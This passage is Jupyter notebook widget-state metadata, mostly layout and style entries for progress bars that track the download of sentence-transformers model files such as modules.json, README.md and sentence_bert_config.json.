            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "HTMLModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/controls",
            "_view_module_version": "1.5.0",
            "_view_name": "HTMLView",
            "description": "",
            "description_tooltip": null,
            "layout": "IPY_MODEL_84df3844b1814a17a2f808adfaf46824",
            "placeholder": "​",
            "style": "IPY_MODEL_f2a65b6f3488479b8f8b27f1cabbff2c",
            "value": "modules.json: 100%"
          }
        },
        "b26e563565ab49b98c8e820da11745d6": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "FloatProgressModel",
          "model_module_version": "1.5.0",
          "state": {
            "_dom_classes": [],
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "FloatProgressModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/controls",
            "_view_module_version": "1.5.0",
            "_view_name": "ProgressView",
            "bar_style": "success",
            "description": "",
            "description_tooltip": null,
            "layout": "IPY_MODEL_8b51ab50ad9c4b8da0288206a3d2fa7e",
            "max": 349,
            "min": 0,
            "orientation": "horizontal",
            "style": "IPY_MODEL_fcfc1529a5d3418b9836a62d0fc106aa",
            "value": 349
          }
        },
        "f96ce438c52248448657762249655156": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "HTMLModel",
          "model_module_version": "1.5.0",
          "state": {
            "_dom_classes": [],
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "HTMLModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/controls",
            "_view_module_version": "1.5.0",
            "_view_name": "HTMLView",
            "description": "",
            "description_tooltip": null,
            "layout": "IPY_MODEL_fef58aea1e2e494aa2010625513e66eb",
            "placeholder": "​",
            "style": "IPY_MODEL_91ee126b22e74615adce362158e8c3a2",
            "value": " 349/349 [00:00&lt;00:00, 20.9kB/s]"
          }
        },
        "e508ab07486c4a468013b088b82bfe4d": {
          "model_module": "@jupyter-widgets/base",
          "model_name": "LayoutModel",
          "model_module_version": "1.2.0",
          "state": {
            "_model_module": "@jupyter-widgets/base",
            "_model_module_version": "1.2.0",
            "_model_name": "LayoutModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "LayoutView",
            "align_content": null,
            "align_items": null,
            "align_self": null,
            "border": null,
            "bottom": null,
            "display": null,
            "flex": null,
            "flex_flow": null,
            "grid_area": null,
            "grid_auto_columns": null,
            "grid_auto_flow": null,
            "grid_auto_rows": null,
            "grid_column": null,
            "grid_gap": null,
            "grid_row": null,
            "grid_template_areas": null,
            "grid_template_columns": null,
            "grid_template_rows": null,
            "height": null,
            "justify_content": null,
            "justify_items": null,
            "left": null,
            "margin": null,
            "max_height": null,
            "max_width": null,
            "min_height": null,
            "min_width": null,
            "object_fit": null,
            "object_position": null,
            "order": null,
            "overflow": null,
            "overflow_x": null,
            "overflow_y": null,
            "padding": null,
            "right": null,
            "top": null,
            "visibility": null,
            "width": null
          }
        },
        "84df3844b1814a17a2f808adfaf46824": {
          "model_module": "@jupyter-widgets/base",
          "model_name": "LayoutModel",
          "model_module_version": "1.2.0",
          "state": {
            "_model_module": "@jupyter-widgets/base",
            "_model_module_version": "1.2.0",
            "_model_name": "LayoutModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "LayoutView",
            "align_content": null,
            "align_items": null,
            "align_self": null,
            "border": null,
            "bottom": null,
            "display": null,
            "flex": null,
            "flex_flow": null,
            "grid_area": null,
            "grid_auto_columns": null,
            "grid_auto_flow": null,
            "grid_auto_rows": null,
            "grid_column": null,
            "grid_gap": null,
            "grid_row": null,
            "grid_template_areas": null,
            "grid_template_columns": null,
            "grid_template_rows": null,
            "height": null,
            "justify_content": null,
            "justify_items": null,
            "left": null,
            "margin": null,
            "max_height": null,
            "max_width": null,
            "min_height": null,
            "min_width": null,
            "object_fit": null,
            "object_position": null,
            "order": null,
            "overflow": null,
            "overflow_x": null,
            "overflow_y": null,
            "padding": null,
            "right": null,
            "top": null,
            "visibility": null,
            "width": null
          }
        },
        "f2a65b6f3488479b8f8b27f1cabbff2c": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "DescriptionStyleModel",
          "model_module_version": "1.5.0",
          "state": {
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "DescriptionStyleModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "StyleView",
            "description_width": ""
          }
        },
        "8b51ab50ad9c4b8da0288206a3d2fa7e": {
          "model_module": "@jupyter-widgets/base",
          "model_name": "LayoutModel",
          "model_module_version": "1.2.0",
          "state": {
            "_model_module": "@jupyter-widgets/base",
            "_model_module_version": "1.2.0",
            "_model_name": "LayoutModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "LayoutView",
            "align_content": null,
            "align_items": null,
            "align_self": null,
            "border": null,
            "bottom": null,
            "display": null,
            "flex": null,
            "flex_flow": null,
            "grid_area": null,
            "grid_auto_columns": null,
            "grid_auto_flow": null,
            "grid_auto_rows": null,
            "grid_column": null,
            "grid_gap": null,
            "grid_row": null,
            "grid_template_areas": null,
            "grid_template_columns": null,
            "grid_template_rows": null,
            "height": null,
            "justify_content": null,
            "justify_items": null,
            "left": null,
            "margin": null,
            "max_height": null,
            "max_width": null,
            "min_height": null,
            "min_width": null,
            "object_fit": null,
            "object_position": null,
            "order": null,
            "overflow": null,
            "overflow_x": null,
            "overflow_y": null,
            "padding": null,
            "right": null,
            "top": null,
            "visibility": null,
            "width": null
          }
        },
        "fcfc1529a5d3418b9836a62d0fc106aa": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "ProgressStyleModel",
          "model_module_version": "1.5.0",
          "state": {
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "ProgressStyleModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "StyleView",
            "bar_color": null,
            "description_width": ""
          }
        },
        "fef58aea1e2e494aa2010625513e66eb": {
          "model_module": "@jupyter-widgets/base",
          "model_name": "LayoutModel",
          "model_module_version": "1.2.0",
          "state": {
            "_model_module": "@jupyter-widgets/base",
            "_model_module_version": "1.2.0",
            "_model_name": "LayoutModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "LayoutView",
            "align_content": null,
            "align_items": null,
            "align_self": null,
            "border": null,
            "bottom": null,
            "display": null,
            "flex": null,
            "flex_flow": null,
            "grid_area": null,
            "grid_auto_columns": null,
            "grid_auto_flow": null,
            "grid_auto_rows": null,
            "grid_column": null,
            "grid_gap": null,
            "grid_row": null,
            "grid_template_areas": null,
            "grid_template_columns": null,
            "grid_template_rows": null,
            "height": null,
            "justify_content": null,
            "justify_items": null,
            "left": null,
            "margin": null,
            "max_height": null,
            "max_width": null,
            "min_height": null,
            "min_width": null,
            "object_fit": null,
            "object_position": null,
            "order": null,
            "overflow": null,
            "overflow_x": null,
            "overflow_y": null,
            "padding": null,
            "right": null,
            "top": null,
            "visibility": null,
            "width": null
          }
        },
        "91ee126b22e74615adce362158e8c3a2": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "DescriptionStyleModel",
          "model_module_version": "1.5.0",
          "state": {
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "DescriptionStyleModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "StyleView",
            "description_width": ""
          }
        },
        "082f318c5fbd484380d8236dc45f9113": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "HBoxModel",
          "model_module_version": "1.5.0",
          "state": {
            "_dom_classes": [],
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "HBoxModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/controls",
            "_view_module_version": "1.5.0",
            "_view_name": "HBoxView",
            "box_style": "",
            "children": [
              "IPY_MODEL_4390291fb8c84d1b811b684c1bae6b64",
              "IPY_MODEL_0a3ab5e4c5f54b37abb04c69364ecafa",
              "IPY_MODEL_0d2a4c2dd3bd47969b06bedf0ff5a112"
            ],
            "layout": "IPY_MODEL_0dc90dc4aedf4c74add67ed612d7f7e3"
          }
        },
        "4390291fb8c84d1b811b684c1bae6b64": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "HTMLModel",
          "model_module_version": "1.5.0",
          "state": {
            "_dom_classes": [],
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "HTMLModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/controls",
            "_view_module_version": "1.5.0",
            "_view_name": "HTMLView",
            "description": "",
            "description_tooltip": null,
            "layout": "IPY_MODEL_fde861780f5840b096cd6b358a3b1988",
            "placeholder": "​",
            "style": "IPY_MODEL_48e0352f24124042ab5ad43d8c056063",
            "value": "config_sentence_transformers.json: 100%"
          }
        },
        "0a3ab5e4c5f54b37abb04c69364ecafa": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "FloatProgressModel",
          "model_module_version": "1.5.0",
          "state": {
            "_dom_classes": [],
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "FloatProgressModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/controls",
            "_view_module_version": "1.5.0",
            "_view_name": "ProgressView",
            "bar_style": "success",
            "description": "",
            "description_tooltip": null,
            "layout": "IPY_MODEL_3587481345634b9cbd471d4ee9688c31",
            "max": 124,
            "min": 0,
            "orientation": "horizontal",
            "style": "IPY_MODEL_f4dc7353f04b48f0bcb2a48f98416ca3",
            "value": 124
          }
        },
        "0d2a4c2dd3bd47969b06bedf0ff5a112": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "HTMLModel",
          "model_module_version": "1.5.0",
          "state": {
            "_dom_classes": [],
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "HTMLModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/controls",
            "_view_module_version": "1.5.0",
            "_view_name": "HTMLView",
            "description": "",
            "description_tooltip": null,
            "layout": "IPY_MODEL_f0c3e17605c64e79aa8a61ff39d2f2db",
            "placeholder": "​",
            "style": "IPY_MODEL_69bb95eda11841afb90fce6286de88d4",
            "value": " 124/124 [00:00&lt;00:00, 5.49kB/s]"
          }
        },
        "0dc90dc4aedf4c74add67ed612d7f7e3": {
          "model_module": "@jupyter-widgets/base",
          "model_name": "LayoutModel",
          "model_module_version": "1.2.0",
          "state": {
            "_model_module": "@jupyter-widgets/base",
            "_model_module_version": "1.2.0",
            "_model_name": "LayoutModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "LayoutView",
            "align_content": null,
            "align_items": null,
            "align_self": null,
            "border": null,
            "bottom": null,
            "display": null,
            "flex": null,
            "flex_flow": null,
            "grid_area": null,
            "grid_auto_columns": null,
            "grid_auto_flow": null,
            "grid_auto_rows": null,
            "grid_column": null,
            "grid_gap": null,
            "grid_row": null,
            "grid_template_areas": null,
            "grid_template_columns": null,
            "grid_template_rows": null,
            "height": null,
            "justify_content": null,
            "justify_items": null,
            "left": null,
            "margin": null,
            "max_height": null,
            "max_width": null,
            "min_height": null,
            "min_width": null,
            "object_fit": null,
            "object_position": null,
            "order": null,
            "overflow": null,
            "overflow_x": null,
            "overflow_y": null,
            "padding": null,
            "right": null,
            "top": null,
            "visibility": null,
            "width": null
          }
        },
        "fde861780f5840b096cd6b358a3b1988": {
          "model_module": "@jupyter-widgets/base",
          "model_name": "LayoutModel",
          "model_module_version": "1.2.0",
          "state": {
            "_model_module": "@jupyter-widgets/base",
            "_model_module_version": "1.2.0",
            "_model_name": "LayoutModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "LayoutView",
            "align_content": null,
            "align_items": null,
            "align_self": null,
            "border": null,
            "bottom": null,
            "display": null,
            "flex": null,
            "flex_flow": null,
            "grid_area": null,
            "grid_auto_columns": null,
            "grid_auto_flow": null,
            "grid_auto_rows": null,
            "grid_column": null,
            "grid_gap": null,
            "grid_row": null,
            "grid_template_areas": null,
            "grid_template_columns": null,
            "grid_template_rows": null,
            "height": null,
            "justify_content": null,
            "justify_items": null,
            "left": null,
            "margin": null,
            "max_height": null,
            "max_width": null,
            "min_height": null,
            "min_width": null,
            "object_fit": null,
            "object_position": null,
            "order": null,
            "overflow": null,
            "overflow_x": null,
            "overflow_y": null,
            "padding": null,
            "right": null,
            "top": null,
            "visibility": null,
            "width": null
          }
        },
        "48e0352f24124042ab5ad43d8c056063": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "DescriptionStyleModel",
          "model_module_version": "1.5.0",
          "state": {
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "DescriptionStyleModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "StyleView",
            "description_width": ""
          }
        },
        "3587481345634b9cbd471d4ee9688c31": {
          "model_module": "@jupyter-widgets/base",
          "model_name": "LayoutModel",
          "model_module_version": "1.2.0",
          "state": {
            "_model_module": "@jupyter-widgets/base",
            "_model_module_version": "1.2.0",
            "_model_name": "LayoutModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "LayoutView",
            "align_content": null,
            "align_items": null,
            "align_self": null,
            "border": null,
            "bottom": null,
            "display": null,
            "flex": null,
            "flex_flow": null,
            "grid_area": null,
            "grid_auto_columns": null,
            "grid_auto_flow": null,
            "grid_auto_rows": null,
            "grid_column": null,
            "grid_gap": null,
            "grid_row": null,
            "grid_template_areas": null,
            "grid_template_columns": null,
            "grid_template_rows": null,
            "height": null,
            "justify_content": null,
            "justify_items": null,
            "left": null,
            "margin": null,
            "max_height": null,
            "max_width": null,
            "min_height": null,
            "min_width": null,
            "object_fit": null,
            "object_position": null,
            "order": null,
            "overflow": null,
            "overflow_x": null,
            "overflow_y": null,
            "padding": null,
            "right": null,
            "top": null,
            "visibility": null,
            "width": null
          }
        },
        "f4dc7353f04b48f0bcb2a48f98416ca3": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "ProgressStyleModel",
          "model_module_version": "1.5.0",
          "state": {
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "ProgressStyleModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "StyleView",
            "bar_color": null,
            "description_width": ""
          }
        },
        "f0c3e17605c64e79aa8a61ff39d2f2db": {
          "model_module": "@jupyter-widgets/base",
          "model_name": "LayoutModel",
          "model_module_version": "1.2.0",
          "state": {
            "_model_module": "@jupyter-widgets/base",
            "_model_module_version": "1.2.0",
            "_model_name": "LayoutModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "LayoutView",
            "align_content": null,
            "align_items": null,
            "align_self": null,
            "border": null,
            "bottom": null,
            "display": null,
            "flex": null,
            "flex_flow": null,
            "grid_area": null,
            "grid_auto_columns": null,
            "grid_auto_flow": null,
            "grid_auto_rows": null,
            "grid_column": null,
            "grid_gap": null,
            "grid_row": null,
            "grid_template_areas": null,
            "grid_template_columns": null,
            "grid_template_rows": null,
            "height": null,
            "justify_content": null,
            "justify_items": null,
            "left": null,
            "margin": null,
            "max_height": null,
            "max_width": null,
            "min_height": null,
            "min_width": null,
            "object_fit": null,
            "object_position": null,
            "order": null,
            "overflow": null,
            "overflow_x": null,
            "overflow_y": null,
            "padding": null,
            "right": null,
            "top": null,
            "visibility": null,
            "width": null
          }
        },
        "69bb95eda11841afb90fce6286de88d4": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "DescriptionStyleModel",
          "model_module_version": "1.5.0",
          "state": {
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "DescriptionStyleModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "StyleView",
            "description_width": ""
          }
        },
        "64f7adbbb81f4b94b58a00bab4b866bf": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "HBoxModel",
          "model_module_version": "1.5.0",
          "state": {
            "_dom_classes": [],
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "HBoxModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/controls",
            "_view_module_version": "1.5.0",
            "_view_name": "HBoxView",
            "box_style": "",
            "children": [
              "IPY_MODEL_407b99f6e5304dc5bb688f9370712678",
              "IPY_MODEL_243bee62fa9f4633a6bf1b254d9f19b8",
              "IPY_MODEL_af5733b030124f84875b1d9c80a3f0a6"
            ],
            "layout": "IPY_MODEL_4d16a9e59a4a4b04b3fffe0b8c6d7a39"
          }
        },
        "407b99f6e5304dc5bb688f9370712678": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "HTMLModel",
          "model_module_version": "1.5.0",
          "state": {
            "_dom_classes": [],
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "HTMLModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/controls",
            "_view_module_version": "1.5.0",
            "_view_name": "HTMLView",
            "description": "",
            "description_tooltip": null,
            "layout": "IPY_MODEL_0c43d0c9bb134a8785a22d90c012b82d",
            "placeholder": "​",
            "style": "IPY_MODEL_ea6f2caf48bc4c13bdf255888cde9083",
            "value": "README.md: 100%"
          }
        },
        "243bee62fa9f4633a6bf1b254d9f19b8": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "FloatProgressModel",
          "model_module_version": "1.5.0",
          "state": {
            "_dom_classes": [],
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "FloatProgressModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/controls",
            "_view_module_version": "1.5.0",
            "_view_name": "ProgressView",
            "bar_style": "success",
            "description": "",
            "description_tooltip": null,
            "layout": "IPY_MODEL_585f0fd45aed4782baf5705339ca93a8",
            "max": 94551,
            "min": 0,
            "orientation": "horizontal",
            "style": "IPY_MODEL_beb269af7ced4d96aeb5f036302fed93",
            "value": 94551
          }
        },
        "af5733b030124f84875b1d9c80a3f0a6": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "HTMLModel",
          "model_module_version": "1.5.0",
          "state": {
            "_dom_classes": [],
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "HTMLModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/controls",
            "_view_module_version": "1.5.0",
            "_view_name": "HTMLView",
            "description": "",
            "description_tooltip": null,
            "layout": "IPY_MODEL_202df67bfca5470da5e8d543a47767d6",
            "placeholder": "​",
            "style": "IPY_MODEL_9c5ddf53a9684ca389940d01fcc1771d",
            "value": " 94.6k/94.6k [00:00&lt;00:00, 4.06MB/s]"
          }
        },
        "4d16a9e59a4a4b04b3fffe0b8c6d7a39": {
          "model_module": "@jupyter-widgets/base",
          "model_name": "LayoutModel",
          "model_module_version": "1.2.0",
          "state": {
            "_model_module": "@jupyter-widgets/base",
            "_model_module_version": "1.2.0",
            "_model_name": "LayoutModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "LayoutView",
            "align_content": null,
            "align_items": null,
            "align_self": null,
            "border": null,
            "bottom": null,
            "display": null,
            "flex": null,
            "flex_flow": null,
            "grid_area": null,
            "grid_auto_columns": null,
            "grid_auto_flow": null,
            "grid_auto_rows": null,
            "grid_column": null,
            "grid_gap": null,
            "grid_row": null,
            "grid_template_areas": null,
            "grid_template_columns": null,
            "grid_template_rows": null,
            "height": null,
            "justify_content": null,
            "justify_items": null,
            "left": null,
            "margin": null,
            "max_height": null,
            "max_width": null,
            "min_height": null,
            "min_width": null,
            "object_fit": null,
            "object_position": null,
            "order": null,
            "overflow": null,
            "overflow_x": null,
            "overflow_y": null,
            "padding": null,
            "right": null,
            "top": null,
            "visibility": null,
            "width": null
          }
        },
        "0c43d0c9bb134a8785a22d90c012b82d": {
          "model_module": "@jupyter-widgets/base",
          "model_name": "LayoutModel",
          "model_module_version": "1.2.0",
          "state": {
            "_model_module": "@jupyter-widgets/base",
            "_model_module_version": "1.2.0",
            "_model_name": "LayoutModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "LayoutView",
            "align_content": null,
            "align_items": null,
            "align_self": null,
            "border": null,
            "bottom": null,
            "display": null,
            "flex": null,
            "flex_flow": null,
            "grid_area": null,
            "grid_auto_columns": null,
            "grid_auto_flow": null,
            "grid_auto_rows": null,
            "grid_column": null,
            "grid_gap": null,
            "grid_row": null,
            "grid_template_areas": null,
            "grid_template_columns": null,
            "grid_template_rows": null,
            "height": null,
            "justify_content": null,
            "justify_items": null,
            "left": null,
            "margin": null,
            "max_height": null,
            "max_width": null,
            "min_height": null,
            "min_width": null,
            "object_fit": null,
            "object_position": null,
            "order": null,
            "overflow": null,
            "overflow_x": null,
            "overflow_y": null,
            "padding": null,
            "right": null,
            "top": null,
            "visibility": null,
            "width": null
          }
        },
        "ea6f2caf48bc4c13bdf255888cde9083": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "DescriptionStyleModel",
          "model_module_version": "1.5.0",
          "state": {
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "DescriptionStyleModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "StyleView",
            "description_width": ""
          }
        },
        "585f0fd45aed4782baf5705339ca93a8": {
          "model_module": "@jupyter-widgets/base",
          "model_name": "LayoutModel",
          "model_module_version": "1.2.0",
          "state": {
            "_model_module": "@jupyter-widgets/base",
            "_model_module_version": "1.2.0",
            "_model_name": "LayoutModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "LayoutView",
            "align_content": null,
            "align_items": null,
            "align_self": null,
            "border": null,
            "bottom": null,
            "display": null,
            "flex": null,
            "flex_flow": null,
            "grid_area": null,
            "grid_auto_columns": null,
            "grid_auto_flow": null,
            "grid_auto_rows": null,
            "grid_column": null,
            "grid_gap": null,
            "grid_row": null,
            "grid_template_areas": null,
            "grid_template_columns": null,
            "grid_template_rows": null,
            "height": null,
            "justify_content": null,
            "justify_items": null,
            "left": null,
            "margin": null,
            "max_height": null,
            "max_width": null,
            "min_height": null,
            "min_width": null,
            "object_fit": null,
            "object_position": null,
            "order": null,
            "overflow": null,
            "overflow_x": null,
            "overflow_y": null,
            "padding": null,
            "right": null,
            "top": null,
            "visibility": null,
            "width": null
          }
        },
        "beb269af7ced4d96aeb5f036302fed93": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "ProgressStyleModel",
          "model_module_version": "1.5.0",
          "state": {
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "ProgressStyleModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "StyleView",
            "bar_color": null,
            "description_width": ""
          }
        },
        "202df67bfca5470da5e8d543a47767d6": {
          "model_module": "@jupyter-widgets/base",
          "model_name": "LayoutModel",
          "model_module_version": "1.2.0",
          "state": {
            "_model_module": "@jupyter-widgets/base",
            "_model_module_version": "1.2.0",
            "_model_name": "LayoutModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "LayoutView",
            "align_content": null,
            "align_items": null,
            "align_self": null,
            "border": null,
            "bottom": null,
            "display": null,
            "flex": null,
            "flex_flow": null,
            "grid_area": null,
            "grid_auto_columns": null,
            "grid_auto_flow": null,
            "grid_auto_rows": null,
            "grid_column": null,
            "grid_gap": null,
            "grid_row": null,
            "grid_template_areas": null,
            "grid_template_columns": null,
            "grid_template_rows": null,
            "height": null,
            "justify_content": null,
            "justify_items": null,
            "left": null,
            "margin": null,
            "max_height": null,
            "max_width": null,
            "min_height": null,
            "min_width": null,
            "object_fit": null,
            "object_position": null,
            "order": null,
            "overflow": null,
            "overflow_x": null,
            "overflow_y": null,
            "padding": null,
            "right": null,
            "top": null,
            "visibility": null,
            "width": null
          }
        },
        "9c5ddf53a9684ca389940d01fcc1771d": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "DescriptionStyleModel",
          "model_module_version": "1.5.0",
          "state": {
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "DescriptionStyleModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "StyleView",
            "description_width": ""
          }
        },
        "33338f5796c74c78a5e065990afe3164": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "HBoxModel",
          "model_module_version": "1.5.0",
          "state": {
            "_dom_classes": [],
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "HBoxModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/controls",
            "_view_module_version": "1.5.0",
            "_view_name": "HBoxView",
            "box_style": "",
            "children": [
              "IPY_MODEL_10dd3c6ddffe457ab0418bfdecdbf014",
              "IPY_MODEL_44575aee07aa45b386dfd3ec0758e8b8",
              "IPY_MODEL_b294841dbb5f4188ab77b52c7e2fea54"
            ],
            "layout": "IPY_MODEL_59697ac31e3147a19fba4294710c0fa4"
          }
        },
        "10dd3c6ddffe457ab0418bfdecdbf014": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "HTMLModel",
          "model_module_version": "1.5.0",
          "state": {
            "_dom_classes": [],
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "HTMLModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/controls",
            "_view_module_version": "1.5.0",
            "_view_name": "HTMLView",
            "description": "",
            "description_tooltip": null,
            "layout": "IPY_MODEL_832832b4eeb74a25bd42ac65e5046fb9",
            "placeholder": "​",
            "style": "IPY_MODEL_38edb409799d4846a46fe96ae78be230",
            "value": "sentence_bert_config.json: 100%"
          }
        },
        "44575aee07aa45b386dfd3ec0758e8b8": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "FloatProgressModel",
          "model_module_version": "1.5.0",
          "state": {
            "_dom_classes": [],
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "FloatProgressModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/controls",
            "_view_module_version": "1.5.0",
            "_view_name": "ProgressView",
            "bar_style": "success",
            "description": "",
            "description_tooltip": null,
            "layout": "IPY_MODEL_767f043e81e54fb0b8ddad17e2d9171c",
            "max": 52,
            "min": 0,
            "orientation": "horizontal",
            "style": "IPY_MODEL_9e66ce61e8d34596af44e81a46e11d1c",
            "value": 52
          }
        },
        "b294841dbb5f4188ab77b52c7e2fea54": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "HTMLModel",
          "model_module_version": "1.5.0",
          "state": {
            "_dom_classes": [],
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "HTMLModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/controls",
            "_view_module_version": "1.5.0",
            "_view_name": "HTMLView",
            "description": "",
            "description_tooltip": null,
            "layout": "IPY_MODEL_422e1b275ccc43e592ea1b58157eb4a0",
            "placeholder": "​",
            "style": "IPY_MODEL_e163545b5daf4f5ab65c5bb8c430d1a3",
            "value": " 52.0/52.0 [00:00&lt;00:00, 2.13kB/s]"
          }
        },
        "59697ac31e3147a19fba4294710c0fa4": {
          "model_module": "@jupyter-widgets/base",
          "model_name": "LayoutModel",
          "model_module_version": "1.2.0",
          "state": {
            "_model_module": "@jupyter-widgets/base",
            "_model_module_version": "1.2.0",
            "_model_name": "LayoutModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "LayoutView",
            "align_content": null,
            "align_items": null,
            "align_self": null,
            "border": null,
            "bottom": null,
            "display": null,
            "flex": null,
            "flex_flow": null,
            "grid_area": null,
            "grid_auto_columns": null,
            "grid_auto_flow": null,
            "grid_auto_rows": null,
            "grid_column": null,
            "grid_gap": null,
            "grid_row": null,
            "grid_template_areas": null,
            "grid_template_columns": null,
            "grid_template_rows": null,
            "height": null,
            "justify_content": null,
            "justify_items": null,
            "left": null,
            "margin": null,
            "max_height": null,
            "max_width": null,
            "min_height": null,
            "min_width": null,
            "object_fit": null,
            "object_position": null,
            "order": null,
            "overflow": null,
            "overflow_x": null,
            "overflow_y": null,
            "padding": null,
            "right": null,
            "top": null,
            "visibility": null,
            "width": null
          }
        },
        "832832b4eeb74a25bd42ac65e5046fb9": {
          "model_module": "@jupyter-widgets/base",
          "model_name": "LayoutModel",
          "model_module_version": "1.2.0",
          "state": {
            "_model_module": "@jupyter-widgets/base",
            "_model_module_version": "1.2.0",
            "_model_name": "LayoutModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "LayoutView",
